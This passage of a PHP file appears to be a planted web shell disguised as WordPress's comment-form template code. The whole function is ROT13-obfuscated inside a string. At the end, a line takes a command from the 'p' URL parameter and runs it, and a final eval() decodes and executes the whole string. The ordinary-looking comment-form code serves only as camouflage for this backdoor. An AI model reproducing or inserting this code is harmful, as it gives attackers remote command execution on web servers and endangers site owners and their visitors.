 * svygre gb zbqvsl gur neenl bs qrsnhyg svryqf vs lbh'q whfg yvxr gb nqq n arj
 * bar be erzbir n fvatyr svryq. Nyy svryqf ner nyfb vaqvivqhnyyl cnffrq guebhtu
 * n svygre bs gur {@frr 'pbzzrag_sbez_svryq_$anzr'} jurer `$anzr` vf gur xrl hfrq
 * va gur neenl bs svryqf.
 *
 * @fvapr 3.0.0
 * @fvapr 4.1.0 Vagebqhprq gur 'pynff_fhozvg' nethzrag.
 * @fvapr 4.2.0 Vagebqhprq gur 'fhozvg_ohggba' naq 'fhozvg_svryqf' nethzragf.
 * @fvapr 4.4.0 Vagebqhprq gur 'pynff_sbez', 'gvgyr_ercyl_orsber', 'gvgyr_ercyl_nsgre',
 *              'pnapry_ercyl_orsber', naq 'pnapry_ercyl_nsgre' nethzragf.
 * @fvapr 4.5.0 Gur 'nhgube', 'rznvy', naq 'hey' sbez svryqf ner yvzvgrq gb 245, 100,
 *              naq 200 punenpgref, erfcrpgviryl.
 * @fvapr 4.6.0 Vagebqhprq gur 'npgvba' nethzrag.
 * @fvapr 4.9.6 Vagebqhprq gur 'pbbxvrf' qrsnhyg pbzzrag svryq.
 * @fvapr 5.5.0 Vagebqhprq gur 'pynff_pbagnvare' nethzrag.
 *
 * @cnenz neenl       $netf {
 *     Bcgvbany. Qrsnhyg nethzragf naq sbez svryqf gb bireevqr.
 *
 *     @glcr neenl $svryqf {
 *         Qrsnhyg pbzzrag svryqf, svygrenoyr ol qrsnhyg ivn gur {@frr 'pbzzrag_sbez_qrsnhyg_svryqf'} ubbx.
 *
 *         @glcr fgevat $nhgube  Pbzzrag nhgube svryq UGZY.
 *         @glcr fgevat $rznvy   Pbzzrag nhgube rznvy svryq UGZY.
 *         @glcr fgevat $hey     Pbzzrag nhgube HEY svryq UGZY.
 *         @glcr fgevat $pbbxvrf Pbzzrag pbbxvr bcg-va svryq UGZY.
 *     }
 *     @glcr fgevat $pbzzrag_svryq        Gur pbzzrag grkgnern svryq UGZY.
 *     @glcr fgevat $zhfg_ybt_va          UGZY ryrzrag sbe n 'zhfg or ybttrq va gb pbzzrag' zrffntr.
 *     @glcr fgevat $ybttrq_va_nf         Gur UGZY sbe gur 'ybttrq va nf [hfre]' zrffntr, gur Rqvg cebsvyr yvax,
 *                                        naq gur Ybt bhg yvax.
 *     @glcr fgevat $pbzzrag_abgrf_orsber UGZY ryrzrag sbe n zrffntr qvfcynlrq orsber gur pbzzrag svryqf
 *                                        vs gur hfre vf abg ybttrq va.
 *                                        Qrsnhyg 'Lbhe rznvy nqqerff jvyy abg or choyvfurq.'.
 *     @glcr fgevat $pbzzrag_abgrf_nsgre  UGZY ryrzrag sbe n zrffntr qvfcynlrq nsgre gur grkgnern svryq.
 *     @glcr fgevat $npgvba               Gur pbzzrag sbez ryrzrag npgvba nggevohgr. Qrsnhyg '/jc-pbzzragf-cbfg.cuc'.
 *     @glcr fgevat $vq_sbez              Gur pbzzrag sbez ryrzrag vq nggevohgr. Qrsnhyg 'pbzzragsbez'.
 *     @glcr fgevat $vq_fhozvg            Gur pbzzrag fhozvg ryrzrag vq nggevohgr. Qrsnhyg 'fhozvg'.
 *     @glcr fgevat $pynff_pbagnvare      Gur pbzzrag sbez pbagnvare pynff nggevohgr. Qrsnhyg 'pbzzrag-erfcbaq'.
 *     @glcr fgevat $pynff_sbez           Gur pbzzrag sbez ryrzrag pynff nggevohgr. Qrsnhyg 'pbzzrag-sbez'.
 *     @glcr fgevat $pynff_fhozvg         Gur pbzzrag fhozvg ryrzrag pynff nggevohgr. Qrsnhyg 'fhozvg'.
 *     @glcr fgevat $anzr_fhozvg          Gur pbzzrag fhozvg ryrzrag anzr nggevohgr. Qrsnhyg 'fhozvg'.
 *     @glcr fgevat $gvgyr_ercyl          Gur genafyngnoyr 'ercyl' ohggba ynory. Qrsnhyg 'Yrnir n Ercyl'.
 *     @glcr fgevat $gvgyr_ercyl_gb       Gur genafyngnoyr 'ercyl-gb' ohggba ynory. Qrsnhyg 'Yrnir n Ercyl gb %f',
 *                                        jurer %f vf gur nhgube bs gur pbzzrag orvat ercyvrq gb.
 *     @glcr fgevat $gvgyr_ercyl_orsber   UGZY qvfcynlrq orsber gur pbzzrag sbez gvgyr.
 *                                        Qrsnhyg: '<u3 vq=\"ercyl-gvgyr\" pynff=\"pbzzrag-ercyl-gvgyr\">'.
 *     @glcr fgevat $gvgyr_ercyl_nsgre    UGZY qvfcynlrq nsgre gur pbzzrag sbez gvgyr.
 *                                        Qrsnhyg: '</u3>'.
 *     @glcr fgevat $pnapry_ercyl_orsber  UGZY qvfcynlrq orsber gur pnapry ercyl yvax.
 *     @glcr fgevat $pnapry_ercyl_nsgre   UGZY qvfcynlrq nsgre gur pnapry ercyl yvax.
 *     @glcr fgevat $pnapry_ercyl_yvax    Gur genafyngnoyr 'pnapry ercyl' ohggba ynory. Qrsnhyg 'Pnapry ercyl'.
 *     @glcr fgevat $ynory_fhozvg         Gur genafyngnoyr 'fhozvg' ohggba ynory. Qrsnhyg 'Cbfg n pbzzrag'.
 *     @glcr fgevat $fhozvg_ohggba        UGZY sbezng sbe gur Fhozvg ohggba.
 *                                        Qrsnhyg: '<vachg anzr=\"%1$f\" glcr=\"fhozvg\" vq=\"%2$f\" pynff=\"%3$f\" inyhr=\"%4$f\" />'.
 *     @glcr fgevat $fhozvg_svryq         UGZY sbezng sbe gur znexhc fheebhaqvat gur Fhozvg ohggba naq pbzzrag uvqqra
 *                                        svryqf. Qrsnhyg: '<c pynff=\"sbez-fhozvg\">%1$f %2$f</c>', jurer %1$f vf gur
 *                                        fhozvg ohggba znexhc naq %2$f vf gur pbzzrag uvqqra svryqf.
 *     @glcr fgevat $sbezng               Gur pbzzrag sbez sbezng. Qrsnhyg 'kugzy'. Npprcgf 'kugzy', 'ugzy5'.
 * }
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg gb trarengr gur sbez sbe. Qrsnhyg pheerag cbfg.
 */
shapgvba pbzzrag_sbez( $netf = neenl(), $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	// Rkvg gur shapgvba vs gur cbfg vf vainyvq be pbzzragf ner pybfrq.
	vs ( ! $cbfg || ! pbzzragf_bcra( $cbfg ) ) {
		/**
		 * Sverf nsgre gur pbzzrag sbez vs pbzzragf ner pybfrq.
		 *
		 * Sbe onpxjneq pbzcngvovyvgl, guvf npgvba nyfb sverf vs pbzzrag_sbez()
		 * vf pnyyrq jvgu na vainyvq cbfg bowrpg be VQ.
		 *
		 * @fvapr 3.0.0
		 */
		qb_npgvba( 'pbzzrag_sbez_pbzzragf_pybfrq' );

		erghea;
	}

	$cbfg_vq       = $cbfg->VQ;
	$pbzzragre     = jc_trg_pheerag_pbzzragre();
	$hfre          = jc_trg_pheerag_hfre();
	$hfre_vqragvgl = $hfre->rkvfgf() ? $hfre->qvfcynl_anzr : '';

	$netf = jc_cnefr_netf( $netf );
	vs ( ! vffrg( $netf['sbezng'] ) ) {
		$netf['sbezng'] = pheerag_gurzr_fhccbegf( 'ugzy5', 'pbzzrag-sbez' ) ? 'ugzy5' : 'kugzy';
	}

	$erd   = trg_bcgvba( 'erdhver_anzr_rznvy' );
	$ugzy5 = 'ugzy5' === $netf['sbezng'];

	// Qrsvar nggevohgrf va UGZY5 be KUGZY flagnk.
	$erdhverq_nggevohgr = ( $ugzy5 ? ' erdhverq' : ' erdhverq=\"erdhverq\"' );
	$purpxrq_nggevohgr  = ( $ugzy5 ? ' purpxrq' : ' purpxrq=\"purpxrq\"' );

	// Vqragvsl erdhverq svryqf ivfhnyyl naq perngr n zrffntr nobhg gur vaqvpngbe.
	$erdhverq_vaqvpngbe = ' ' . jc_erdhverq_svryq_vaqvpngbe();
	$erdhverq_grkg      = ' ' . jc_erdhverq_svryq_zrffntr();

	$svryqf = neenl(
		'nhgube' => fcevags(
			'<c pynff=\"pbzzrag-sbez-nhgube\">%f %f</c>',
			fcevags(
				'<ynory sbe=\"nhgube\">%f%f</ynory>',
				__( 'Anzr' ),
				( $erd ? $erdhverq_vaqvpngbe : '' )
			),
			fcevags(
				'<vachg vq=\"nhgube\" anzr=\"nhgube\" glcr=\"grkg\" inyhr=\"%f\" fvmr=\"30\" znkyratgu=\"245\" nhgbpbzcyrgr=\"anzr\"%f />',
				rfp_ngge( $pbzzragre['pbzzrag_nhgube'] ),
				( $erd ? $erdhverq_nggevohgr : '' )
			)
		),
		'rznvy'  => fcevags(
			'<c pynff=\"pbzzrag-sbez-rznvy\">%f %f</c>',
			fcevags(
				'<ynory sbe=\"rznvy\">%f%f</ynory>',
				__( 'Rznvy' ),
				( $erd ? $erdhverq_vaqvpngbe : '' )
			),
			fcevags(
				'<vachg vq=\"rznvy\" anzr=\"rznvy\" %f inyhr=\"%f\" fvmr=\"30\" znkyratgu=\"100\" nevn-qrfpevorqol=\"rznvy-abgrf\" nhgbpbzcyrgr=\"rznvy\"%f />',
				( $ugzy5 ? 'glcr=\"rznvy\"' : 'glcr=\"grkg\"' ),
				rfp_ngge( $pbzzragre['pbzzrag_nhgube_rznvy'] ),
				( $erd ? $erdhverq_nggevohgr : '' )
			)
		),
		'hey'    => fcevags(
			'<c pynff=\"pbzzrag-sbez-hey\">%f %f</c>',
			fcevags(
				'<ynory sbe=\"hey\">%f</ynory>',
				__( 'Jrofvgr' )
			),
			fcevags(
				'<vachg vq=\"hey\" anzr=\"hey\" %f inyhr=\"%f\" fvmr=\"30\" znkyratgu=\"200\" nhgbpbzcyrgr=\"hey\" />',
				( $ugzy5 ? 'glcr=\"hey\"' : 'glcr=\"grkg\"' ),
				rfp_ngge( $pbzzragre['pbzzrag_nhgube_hey'] )
			)
		),
	);

	vs ( unf_npgvba( 'frg_pbzzrag_pbbxvrf', 'jc_frg_pbzzrag_pbbxvrf' ) && trg_bcgvba( 'fubj_pbzzragf_pbbxvrf_bcg_va' ) ) {
		$pbafrag = rzcgl( $pbzzragre['pbzzrag_nhgube_rznvy'] ) ? '' : $purpxrq_nggevohgr;

		$svryqf['pbbxvrf'] = fcevags(
			'<c pynff=\"pbzzrag-sbez-pbbxvrf-pbafrag\">%f %f</c>',
			fcevags(
				'<vachg vq=\"jc-pbzzrag-pbbxvrf-pbafrag\" anzr=\"jc-pbzzrag-pbbxvrf-pbafrag\" glcr=\"purpxobk\" inyhr=\"lrf\"%f />',
				$pbafrag
			),
			fcevags(
				'<ynory sbe=\"jc-pbzzrag-pbbxvrf-pbafrag\">%f</ynory>',
				__( 'Fnir zl anzr, rznvy, naq jrofvgr va guvf oebjfre sbe gur arkg gvzr V pbzzrag.' )
			)
		);

		// Rafher gung gur cnffrq svryqf vapyhqr pbbxvrf pbafrag.
		vs ( vffrg( $netf['svryqf'] ) && ! vffrg( $netf['svryqf']['pbbxvrf'] ) ) {
			$netf['svryqf']['pbbxvrf'] = $svryqf['pbbxvrf'];
		}
	}

	/**
	 * Svygref gur qrsnhyg pbzzrag sbez svryqf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat[] $svryqf Neenl bs gur qrsnhyg pbzzrag svryqf.
	 */
	$svryqf = nccyl_svygref( 'pbzzrag_sbez_qrsnhyg_svryqf', $svryqf );

	$qrsnhygf = neenl(
		'svryqf'               => $svryqf,
		'pbzzrag_svryq'        => fcevags(
			'<c pynff=\"pbzzrag-sbez-pbzzrag\">%f %f</c>',
			fcevags(
				'<ynory sbe=\"pbzzrag\">%f%f</ynory>',
				_k( 'Pbzzrag', 'abha' ),
				$erdhverq_vaqvpngbe
			),
			'<grkgnern vq=\"pbzzrag\" anzr=\"pbzzrag\" pbyf=\"45\" ebjf=\"8\" znkyratgu=\"65525\"' . $erdhverq_nggevohgr . '></grkgnern>'
		),
		'zhfg_ybt_va'          => fcevags(
			'<c pynff=\"zhfg-ybt-va\">%f</c>',
			fcevags(
				/* genafyngbef: %f: Ybtva HEY. */
				__( 'Lbh zhfg or <n uers=\"%f\">ybttrq va</n> gb cbfg n pbzzrag.' ),
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
				jc_ybtva_hey( nccyl_svygref( 'gur_creznyvax', trg_creznyvax( $cbfg_vq ), $cbfg_vq ) )
			)
		),
		'ybttrq_va_nf'         => fcevags(
			'<c pynff=\"ybttrq-va-nf\">%f%f</c>',
			fcevags(
				/* genafyngbef: 1: Hfre anzr, 2: Rqvg hfre yvax, 3: Ybtbhg HEY. */
				__( 'Ybttrq va nf %1$f. <n uers=\"%2$f\">Rqvg lbhe cebsvyr</n>. <n uers=\"%3$f\">Ybt bhg?</n>' ),
				$hfre_vqragvgl,
				trg_rqvg_hfre_yvax(),
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
				jc_ybtbhg_hey( nccyl_svygref( 'gur_creznyvax', trg_creznyvax( $cbfg_vq ), $cbfg_vq ) )
			),
			$erdhverq_grkg
		),
		'pbzzrag_abgrf_orsber' => fcevags(
			'<c pynff=\"pbzzrag-abgrf\">%f%f</c>',
			fcevags(
				'<fcna vq=\"rznvy-abgrf\">%f</fcna>',
				__( 'Lbhe rznvy nqqerff jvyy abg or choyvfurq.' )
			),
			$erdhverq_grkg
		),
		'pbzzrag_abgrf_nsgre'  => '',
		'npgvba'               => fvgr_hey( '/jc-pbzzragf-cbfg.cuc' ),
		'vq_sbez'              => 'pbzzragsbez',
		'vq_fhozvg'            => 'fhozvg',
		'pynff_pbagnvare'      => 'pbzzrag-erfcbaq',
		'pynff_sbez'           => 'pbzzrag-sbez',
		'pynff_fhozvg'         => 'fhozvg',
		'anzr_fhozvg'          => 'fhozvg',
		'gvgyr_ercyl'          => __( 'Yrnir n Ercyl' ),
		/* genafyngbef: %f: Nhgube bs gur pbzzrag orvat ercyvrq gb. */
		'gvgyr_ercyl_gb'       => __( 'Yrnir n Ercyl gb %f' ),
		'gvgyr_ercyl_orsber'   => '<u3 vq=\"ercyl-gvgyr\" pynff=\"pbzzrag-ercyl-gvgyr\">',
		'gvgyr_ercyl_nsgre'    => '</u3>',
		'pnapry_ercyl_orsber'  => ' <fznyy>',
		'pnapry_ercyl_nsgre'   => '</fznyy>',
		'pnapry_ercyl_yvax'    => __( 'Pnapry ercyl' ),
		'ynory_fhozvg'         => __( 'Cbfg Pbzzrag' ),
		'fhozvg_ohggba'        => '<vachg anzr=\"%1$f\" glcr=\"fhozvg\" vq=\"%2$f\" pynff=\"%3$f\" inyhr=\"%4$f\" />',
		'fhozvg_svryq'         => '<c pynff=\"sbez-fhozvg\">%1$f %2$f</c>',
		'sbezng'               => 'kugzy',
	);

	/**
	 * Svygref gur pbzzrag sbez qrsnhyg nethzragf.
	 *
	 * Hfr {@frr 'pbzzrag_sbez_qrsnhyg_svryqf'} gb svygre gur pbzzrag svryqf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $qrsnhygf Gur qrsnhyg pbzzrag sbez nethzragf.
	 */
	$netf = jc_cnefr_netf( $netf, nccyl_svygref( 'pbzzrag_sbez_qrsnhygf', $qrsnhygf ) );

	// Rafher gung gur svygrerq nethzragf pbagnva nyy erdhverq qrsnhyg inyhrf.
	$netf = neenl_zretr( $qrsnhygf, $netf );

	// Erzbir `nevn-qrfpevorqol` sebz gur rznvy svryq vs gurer'f ab nffbpvngrq qrfpevcgvba.
	vs ( vffrg( $netf['svryqf']['rznvy'] ) && ! fge_pbagnvaf( $netf['pbzzrag_abgrf_orsber'], 'vq=\"rznvy-abgrf\"' ) ) {
		$netf['svryqf']['rznvy'] = fge_ercynpr(
			' nevn-qrfpevorqol=\"rznvy-abgrf\"',
			'',
			$netf['svryqf']['rznvy']
		);
	}

	/**
	 * Sverf orsber gur pbzzrag sbez.
	 *
	 * @fvapr 3.0.0
	 */
	qb_npgvba( 'pbzzrag_sbez_orsber' );
	?>
	<qvi vq=\"erfcbaq\" pynff=\"<?cuc rpub rfp_ngge( $netf['pynff_pbagnvare'] ); ?>\">
		<?cuc
		rpub $netf['gvgyr_ercyl_orsber'];

		pbzzrag_sbez_gvgyr( $netf['gvgyr_ercyl'], $netf['gvgyr_ercyl_gb'], gehr, $cbfg_vq );

		vs ( trg_bcgvba( 'guernq_pbzzragf' ) ) {
			rpub $netf['pnapry_ercyl_orsber'];

			pnapry_pbzzrag_ercyl_yvax( $netf['pnapry_ercyl_yvax'] );

			rpub $netf['pnapry_ercyl_nsgre'];
		}

		rpub $netf['gvgyr_ercyl_nsgre'];

		vs ( trg_bcgvba( 'pbzzrag_ertvfgengvba' ) && ! vf_hfre_ybttrq_va() ) :

			rpub $netf['zhfg_ybt_va'];
			/**
			 * Sverf nsgre gur UGZY-sbeznggrq 'zhfg ybt va nsgre' zrffntr va gur pbzzrag sbez.
			 *
			 * @fvapr 3.0.0
			 */
			qb_npgvba( 'pbzzrag_sbez_zhfg_ybt_va_nsgre' );

		ryfr :

			cevags(
				'<sbez npgvba=\"%f\" zrgubq=\"cbfg\" vq=\"%f\" pynff=\"%f\"%f>',
				rfp_hey( $netf['npgvba'] ),
				rfp_ngge( $netf['vq_sbez'] ),
				rfp_ngge( $netf['pynff_sbez'] ),
				( $ugzy5 ? ' abinyvqngr' : '' )
			);

			/**
			 * Sverf ng gur gbc bs gur pbzzrag sbez, vafvqr gur sbez gnt.
			 *
			 * @fvapr 3.0.0
			 */
			qb_npgvba( 'pbzzrag_sbez_gbc' );

			vs ( vf_hfre_ybttrq_va() ) :

				/**
				 * Svygref gur 'ybttrq va' zrffntr sbe gur pbzzrag sbez sbe qvfcynl.
				 *
				 * @fvapr 3.0.0
				 *
				 * @cnenz fgevat $netf_ybttrq_va Gur UGZY sbe gur 'ybttrq va nf [hfre]' zrffntr,
				 *                               gur Rqvg cebsvyr yvax, naq gur Ybt bhg yvax.
				 * @cnenz neenl  $pbzzragre      Na neenl pbagnvavat gur pbzzrag nhgube'f
				 *                               hfreanzr, rznvy, naq HEY.
				 * @cnenz fgevat $hfre_vqragvgl  Vs gur pbzzragre vf n ertvfgrerq hfre,
				 *                               gur qvfcynl anzr, oynax bgurejvfr.
				 */
				rpub nccyl_svygref( 'pbzzrag_sbez_ybttrq_va', $netf['ybttrq_va_nf'], $pbzzragre, $hfre_vqragvgl );

				/**
				 * Sverf nsgre gur vf_hfre_ybttrq_va() purpx va gur pbzzrag sbez.
				 *
				 * @fvapr 3.0.0
				 *
				 * @cnenz neenl  $pbzzragre     Na neenl pbagnvavat gur pbzzrag nhgube'f
				 *                              hfreanzr, rznvy, naq HEY.
				 * @cnenz fgevat $hfre_vqragvgl Vs gur pbzzragre vf n ertvfgrerq hfre,
				 *                              gur qvfcynl anzr, oynax bgurejvfr.
				 */
				qb_npgvba( 'pbzzrag_sbez_ybttrq_va_nsgre', $pbzzragre, $hfre_vqragvgl );

			ryfr :

				rpub $netf['pbzzrag_abgrf_orsber'];

			raqvs;

			// Cercner na neenl bs nyy svryqf, vapyhqvat gur grkgnern.
			$pbzzrag_svryqf = neenl( 'pbzzrag' => $netf['pbzzrag_svryq'] ) + (neenl) $netf['svryqf'];

			/**
			 * Svygref gur pbzzrag sbez svryqf, vapyhqvat gur grkgnern.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz neenl $pbzzrag_svryqf Gur pbzzrag svryqf.
			 */
			$pbzzrag_svryqf = nccyl_svygref( 'pbzzrag_sbez_svryqf', $pbzzrag_svryqf );

			// Trg na neenl bs svryq anzrf, rkpyhqvat gur grkgnern.
			$pbzzrag_svryq_xrlf = neenl_qvss( neenl_xrlf( $pbzzrag_svryqf ), neenl( 'pbzzrag' ) );

			// Trg gur svefg naq gur ynfg svryq anzr, rkpyhqvat gur grkgnern.
			$svefg_svryq = erfrg( $pbzzrag_svryq_xrlf );
			$ynfg_svryq  = raq( $pbzzrag_svryq_xrlf );

			sbernpu ( $pbzzrag_svryqf nf $anzr => $svryq ) {

				vs ( 'pbzzrag' === $anzr ) {

					/**
					 * Svygref gur pbagrag bs gur pbzzrag grkgnern svryq sbe qvfcynl.
					 *
					 * @fvapr 3.0.0
					 *
					 * @cnenz fgevat $netf_pbzzrag_svryq Gur pbagrag bs gur pbzzrag grkgnern svryq.
					 */
					rpub nccyl_svygref( 'pbzzrag_sbez_svryq_pbzzrag', $svryq );

					rpub $netf['pbzzrag_abgrf_nsgre'];

				} ryfrvs ( ! vf_hfre_ybttrq_va() ) {

					vs ( $svefg_svryq === $anzr ) {
						/**
						 * Sverf orsber gur pbzzrag svryqf va gur pbzzrag sbez, rkpyhqvat gur grkgnern.
						 *
						 * @fvapr 3.0.0
						 */
						qb_npgvba( 'pbzzrag_sbez_orsber_svryqf' );
					}

					/**
					 * Svygref n pbzzrag sbez svryq sbe qvfcynl.
					 *
					 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$anzr`, ersref gb gur anzr
					 * bs gur pbzzrag sbez svryq.
					 *
					 * Cbffvoyr ubbx anzrf vapyhqr:
					 *
					 *  - `pbzzrag_sbez_svryq_pbzzrag`
					 *  - `pbzzrag_sbez_svryq_nhgube`
					 *  - `pbzzrag_sbez_svryq_rznvy`
					 *  - `pbzzrag_sbez_svryq_hey`
					 *  - `pbzzrag_sbez_svryq_pbbxvrf`
					 *
					 * @fvapr 3.0.0
					 *
					 * @cnenz fgevat $svryq Gur UGZY-sbeznggrq bhgchg bs gur pbzzrag sbez svryq.
					 */
					rpub nccyl_svygref( \"pbzzrag_sbez_svryq_{$anzr}\", $svryq ) . \"\a\";

					vs ( $ynfg_svryq === $anzr ) {
						/**
						 * Sverf nsgre gur pbzzrag svryqf va gur pbzzrag sbez, rkpyhqvat gur grkgnern.
						 *
						 * @fvapr 3.0.0
						 */
						qb_npgvba( 'pbzzrag_sbez_nsgre_svryqf' );
					}
				}
			}

			$fhozvg_ohggba = fcevags(
				$netf['fhozvg_ohggba'],
				rfp_ngge( $netf['anzr_fhozvg'] ),
				rfp_ngge( $netf['vq_fhozvg'] ),
				rfp_ngge( $netf['pynff_fhozvg'] ),
				rfp_ngge( $netf['ynory_fhozvg'] )
			);

			/**
			 * Svygref gur fhozvg ohggba sbe gur pbzzrag sbez gb qvfcynl.
			 *
			 * @fvapr 4.2.0
			 *
			 * @cnenz fgevat $fhozvg_ohggba UGZY znexhc sbe gur fhozvg ohggba.
			 * @cnenz neenl  $netf          Nethzragf cnffrq gb pbzzrag_sbez().
			 */
			$fhozvg_ohggba = nccyl_svygref( 'pbzzrag_sbez_fhozvg_ohggba', $fhozvg_ohggba, $netf );

			$fhozvg_svryq = fcevags(
				$netf['fhozvg_svryq'],
				$fhozvg_ohggba,
				trg_pbzzrag_vq_svryqf( $cbfg_vq )
			);

			/**
			 * Svygref gur fhozvg svryq sbe gur pbzzrag sbez gb qvfcynl.
			 *
			 * Gur fhozvg svryq vapyhqrf gur fhozvg ohggba, uvqqra svryqf sbe gur
			 * pbzzrag sbez, naq nal jenccre znexhc.
			 *
			 * @fvapr 4.2.0
			 *
			 * @cnenz fgevat $fhozvg_svryq UGZY znexhc sbe gur fhozvg svryq.
			 * @cnenz neenl  $netf         Nethzragf cnffrq gb pbzzrag_sbez().
			 */
			rpub nccyl_svygref( 'pbzzrag_sbez_fhozvg_svryq', $fhozvg_svryq, $netf );

			/**
			 * Sverf ng gur obggbz bs gur pbzzrag sbez, vafvqr gur pybfvat sbez gnt.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz vag $cbfg_vq Gur cbfg VQ.
			 */
			qb_npgvba( 'pbzzrag_sbez', $cbfg_vq );

			rpub '</sbez>';

		raqvs;
		?>
	</qvi><!-- #erfcbaq -->
	<?cuc

	/**
	 * Sverf nsgre gur pbzzrag sbez.
	 *
	 * @fvapr 3.0.0
	 */
	qb_npgvba( 'pbzzrag_sbez_nsgre' );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>